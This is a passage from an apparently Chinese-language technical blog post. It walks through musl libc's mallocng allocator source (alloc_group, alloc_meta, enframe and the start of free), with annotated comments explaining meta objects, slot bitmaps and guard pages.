decay_bounces(m-&gt;sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//取出</span></span><br><span class="line">    first = mask&amp;-mask;</span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>查看这个meta-group中freed_mask中有无chunk，如果freed_mask为0, 说明这个meta-group中没有释放的chunk，就从队列中取出</li>
<li>如果有的话就会通过<code>active_group()</code>把freed_mask中的chunk转移到avail_mask中</li>
</ul>

        <h4 id="③alloc-group"   >
          <a href="#③alloc-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#③alloc-group" class="headerlink" title="③alloc_group"></a>③alloc_group</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//用来分配一个新的group</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct meta *<span class="title">alloc_group</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = UNIT*size_classes[sc];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, cnt;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//先分配一个meta管理group</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line">    <span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">    <span class="keyword">int</span> active_idx;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i&lt;<span class="number">2</span> &amp;&amp; <span class="number">4</span>*small_cnt_tab[sc][i] &gt; usage)</span><br><span class="line">            i++;</span><br><span class="line">        cnt = small_cnt_tab[sc][i];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// lookup max number of slots fitting in power-of-two size</span></span><br><span class="line">        <span class="comment">// from a table, along with number of factors of two we</span></span><br><span class="line">        <span class="comment">// can divide out without a remainder or reaching 1.</span></span><br><span class="line">        cnt = med_cnt_tab[sc&amp;<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reduce cnt to avoid excessive eagar allocation.</span></span><br><span class="line">        <span class="keyword">while</span> (!(cnt&amp;<span class="number">1</span>) &amp;&amp; <span class="number">4</span>*cnt &gt; usage)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// data structures don&#x27;t support groups whose slot offsets</span></span><br><span class="line">        <span class="comment">// in units don&#x27;t fit in 16 bits.</span></span><br><span class="line">        <span class="keyword">while</span> (size*cnt &gt;= <span class="number">65536</span>*UNIT)</span><br><span class="line">            cnt &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we selected a count of 1 above but it&#x27;s not sufficient to use</span></span><br><span class="line">    <span class="comment">// mmap, increase to 2. Then it might be; if not it will nest.</span></span><br><span class="line">    <span class="keyword">if</span> (cnt==<span class="number">1</span> &amp;&amp; size*cnt+UNIT &lt;= pagesize/<span class="number">2</span>) cnt = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All choices of size*cnt are &quot;just below&quot; a power of two, so anything</span></span><br><span class="line">    <span class="comment">// larger than half the page size should be allocated as whole pages.</span></span><br><span class="line">    <span class="keyword">if</span> (size*cnt+UNIT &gt; pagesize/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// check/update bounce counter to start/increase retention</span></span><br><span class="line">        <span class="comment">// of freed maps, and inhibit use of low-count, odd-size</span></span><br><span class="line">        <span class="comment">// small mappings and single-slot groups if activated.</span></span><br><span class="line">        <span class="keyword">int</span> nosmall = is_bouncing(sc);</span><br><span class="line">        account_bounce(sc);</span><br><span class="line">        step_seq();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// since the following count reduction opportunities have</span></span><br><span class="line">        <span class="comment">// an absolute memory usage cost, don&#x27;t overdo them. count</span></span><br><span class="line">        <span class="comment">// coarse usage as part of usage.</span></span><br><span class="line">        <span class="keyword">if</span> (!(sc&amp;<span class="number">1</span>) &amp;&amp; sc&lt;<span class="number">32</span>) usage += ctx.usage_by_class[sc+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to drop to a lower count if the one found above</span></span><br><span class="line">        <span class="comment">// increases usage by more than 25%. these reduced counts</span></span><br><span class="line">        <span class="comment">// roughly fill an integral number of pages, just not a</span></span><br><span class="line">        <span class="comment">// power of two, limiting amount of unusable space.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">4</span>*cnt &gt; usage &amp;&amp; !nosmall) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">1</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">2</span> &amp;&amp; size*cnt&gt;<span class="number">4</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">8</span>*pagesize) cnt = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((sc&amp;<span class="number">3</span>)==<span class="number">0</span> &amp;&amp; size*cnt&gt;<span class="number">2</span>*pagesize) cnt = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">size_t</span> needed = size*cnt + UNIT;</span><br><span class="line">        needed += -needed &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// produce an individually-mmapped allocation if usage is low,</span></span><br><span class="line">        <span class="comment">// bounce counter hasn&#x27;t triggered, and either it saves memory</span></span><br><span class="line">        <span class="comment">// or it avoids eagar slot allocation without wasting too much.</span></span><br><span class="line">        <span class="keyword">if</span> (!nosmall &amp;&amp; cnt&lt;=<span class="number">7</span>) &#123;</span><br><span class="line">            req += IB + UNIT;</span><br><span class="line">            req += -req &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">if</span> (req&lt;size+UNIT || (req&gt;=<span class="number">4</span>*pagesize &amp;&amp; <span class="number">2</span>*cnt&gt;usage)) &#123;</span><br><span class="line">                cnt = <span class="number">1</span>;</span><br><span class="line">                needed = req;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m-&gt;maplen = needed&gt;&gt;<span class="number">12</span>;</span><br><span class="line">        ctx.mmap_counter++;</span><br><span class="line">        active_idx = (<span class="number">4096</span>-UNIT)/size<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &gt; cnt<span class="number">-1</span>) active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> j = size_to_class(UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">int</span> idx = alloc_slot(j, UNIT+cnt*size-IB);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            free_meta(m);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">        p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);</span><br><span class="line">        m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">        p[<span class="number">-3</span>] = (p[<span class="number">-3</span>]&amp;<span class="number">31</span>) | (<span class="number">6</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=cnt; i++)</span><br><span class="line">            p[UNIT+i*size<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">        active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.usage_by_class[sc] += cnt;</span><br><span class="line">    m-&gt;avail_mask = (<span class="number">2u</span>&lt;&lt;active_idx)<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freed_mask = (<span class="number">2u</span>&lt;&lt;(cnt<span class="number">-1</span>))<span class="number">-1</span> - m-&gt;avail_mask;</span><br><span class="line">    m-&gt;mem = (<span class="keyword">void</span> *)p;</span><br><span class="line">    m-&gt;mem-&gt;meta = m;</span><br><span class="line">    m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">    m-&gt;last_idx = cnt<span class="number">-1</span>;</span><br><span class="line">    m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    m-&gt;sizeclass = sc;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过mmap分配Group，初始化相关信息。</p>

        <h4 id="④alloc-meta"   >
          <a href="#④alloc-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#④alloc-meta" class="headerlink" title="④alloc_meta"></a>④alloc_meta</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="comment">//用来分配meta对象</span></span><br><span class="line"><span class="function">struct meta *<span class="title">alloc_meta</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="comment">//判断ctx是否完成初始化，没完成就整一下</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.init_done) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">		ctx.pagesize = get_page_size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		ctx.secret = get_random_secret();</span><br><span class="line">		ctx.init_done = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//pagesize的设置</span></span><br><span class="line">	<span class="keyword">size_t</span> pagesize = PGSZ;</span><br><span class="line">	<span class="keyword">if</span> (pagesize &lt; <span class="number">4096</span>) pagesize = <span class="number">4096</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//首先看能不能从free_meta_head中获得meta对象，一般是将一个meta-group中的</span></span><br><span class="line">    <span class="comment">//chunk全部分配完然后全部释放完就会自动进入meta-group的释放阶段，成功就进入</span></span><br><span class="line">    <span class="comment">//进入到ctx.free_meta_head中</span></span><br><span class="line">	<span class="keyword">if</span> ((m = dequeue_head(&amp;ctx.free_meta_head))) <span class="keyword">return</span> m;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ctx中如果没有可用的meat对象</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx.avail_meta_count) &#123;</span><br><span class="line">		<span class="keyword">int</span> need_unprotect = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//ctx中没有空闲的meat对象且ctx.brk不为-1</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count &amp;&amp; ctx.brk!=<span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="comment">//分配一页内存0x1000</span></span><br><span class="line">			<span class="keyword">uintptr_t</span> <span class="keyword">new</span> = ctx.brk + pagesize;</span><br><span class="line">			<span class="keyword">int</span> need_guard = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//如果ctx.brk为0,一般在初始化的时候</span></span><br><span class="line">			<span class="keyword">if</span> (!ctx.brk) &#123;</span><br><span class="line">				need_guard = <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//调用brk()获取堆地址</span></span><br><span class="line">				ctx.brk = brk(<span class="number">0</span>);</span><br><span class="line">				<span class="comment">// some ancient kernels returned _ebss</span></span><br><span class="line">				<span class="comment">// instead of next page as initial brk.</span></span><br><span class="line">				ctx.brk += -ctx.brk &amp; (pagesize<span class="number">-1</span>);</span><br><span class="line">				<span class="keyword">new</span> = ctx.brk + <span class="number">2</span>*pagesize;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">//brk()分配heap到new地址失败</span></span><br><span class="line">			<span class="keyword">if</span> (brk(<span class="keyword">new</span>) != <span class="keyword">new</span>) &#123;</span><br><span class="line">				ctx.brk = <span class="number">-1</span>;</span><br><span class="line">			&#125; </span><br><span class="line">            <span class="comment">//分配成功</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//保护页, 在brk后面映射一个不可用的页(PROT_NONE),</span></span><br><span class="line">                <span class="comment">//如果堆溢出到这里就会发送SIGV</span></span><br><span class="line">				<span class="keyword">if</span> (need_guard) mmap((<span class="keyword">void</span> *)ctx.brk, pagesize,</span><br><span class="line">					PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">				ctx.brk = <span class="keyword">new</span>;</span><br><span class="line">                <span class="comment">//把这一页全划分为meta对象</span></span><br><span class="line">				ctx.avail_meta_areas = (<span class="keyword">void</span> *)(<span class="keyword">new</span> - pagesize);</span><br><span class="line">				ctx.avail_meta_area_count = pagesize&gt;&gt;<span class="number">12</span>;</span><br><span class="line">				need_unprotect = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//如果前面brk()分配失败了, 直接mmap匿名映射一片PROT_NONE的内存再划分</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.avail_meta_area_count) &#123;</span><br><span class="line">			<span class="keyword">size_t</span> n = <span class="number">2UL</span> &lt;&lt; ctx.meta_alloc_shift;</span><br><span class="line">			p = mmap(<span class="number">0</span>, n*pagesize, PROT_NONE,</span><br><span class="line">				MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			ctx.avail_meta_areas = p + pagesize;</span><br><span class="line">			ctx.avail_meta_area_count = (n<span class="number">-1</span>)*(pagesize&gt;&gt;<span class="number">12</span>);</span><br><span class="line">			ctx.meta_alloc_shift++;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//如果avail_meta_areas与4K对齐, 那么就说明这片区域是刚刚申请的一页</span></span><br><span class="line">        <span class="comment">//所以需要修改内存的权限,更改为读写保护的</span></span><br><span class="line">		p = ctx.avail_meta_areas;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)p &amp; (pagesize<span class="number">-1</span>)) need_unprotect = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (need_unprotect)</span><br><span class="line">			<span class="keyword">if</span> (mprotect(p, pagesize, PROT_READ|PROT_WRITE)</span><br><span class="line">			    &amp;&amp; errno != ENOSYS)</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		ctx.avail_meta_area_count--;</span><br><span class="line">		ctx.avail_meta_areas = p + <span class="number">4096</span>;</span><br><span class="line">		<span class="keyword">if</span> (ctx.meta_area_tail) &#123;</span><br><span class="line">			ctx.meta_area_tail-&gt;next = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ctx.meta_area_head = (<span class="keyword">void</span> *)p;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//初始化ctx的相关信息</span></span><br><span class="line">		ctx.meta_area_tail = (<span class="keyword">void</span> *)p;</span><br><span class="line">		ctx.meta_area_tail-&gt;check = ctx.secret;</span><br><span class="line">		ctx.avail_meta_count = ctx.meta_area_tail-&gt;nslots</span><br><span class="line">			= (<span class="number">4096</span>-<span class="keyword">sizeof</span>(struct meta_area))/<span class="keyword">sizeof</span> *m;</span><br><span class="line">		ctx.avail_meta = ctx.meta_area_tail-&gt;slots;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//ctx的可用meta对象数组中有能用的,从中直接分配出来即可</span></span><br><span class="line">	ctx.avail_meta_count--;</span><br><span class="line">	m = ctx.avail_meta++;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>查看ctx是否完成初始化，没完成就初始化一下</li>
<li>如果ctx.free_meta_head链表中有空闲的meta, 那么直接从这里分配一个meta</li>
<li>如果ctx.avail_meta_count&gt;0，代表最开始分配出来的meta对象还没有被用完，直接从ctx.avail_meta对象数组中分配一个</li>
<li>如果ctx.avail_meta_count=0，则代表最开始分配的meta对象已经用完，没有可用的，那么就说明需要向OS申请内存存放meta<ul>
<li>先通过brk分配1页，如果分配成功，则将新的内存页直接划分为meta对象，然后修改之后的内存页的权限。</li>
<li>如果brk失败的话则会通过mmap()分配许多页内存, 但是这些内存都是PROT_NONE的, 属于guard page, 堆溢出到这些页面会引发SIGV, 而meta不使用开头与结尾的一页, 防止被溢出</li>
</ul>
</li>
<li>分配成功后设置ctx中的meta_area_tail, avail_meta_cnt等信息, 把新分配的一页作为待划分的meta。</li>
</ul>

        <h4 id="⑤enframe"   >
          <a href="#⑤enframe" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤enframe" class="headerlink" title="⑤enframe"></a>⑤enframe</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//分配chunk时，设置group用的函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">enframe</span><span class="params">(struct meta *g, <span class="keyword">int</span> idx, <span class="keyword">size_t</span> n, <span class="keyword">int</span> ctr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="keyword">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="keyword">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-free-1"   >
          <a href="#2-free-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free-1" class="headerlink" title="(2)free"></a>(2)free</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line">   	<span class="comment">//获取相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="keyword">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="keyword">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//计算这个chunk对应avail_mask和freed_mask的bitmap</span></span><br><span class="line">	<span 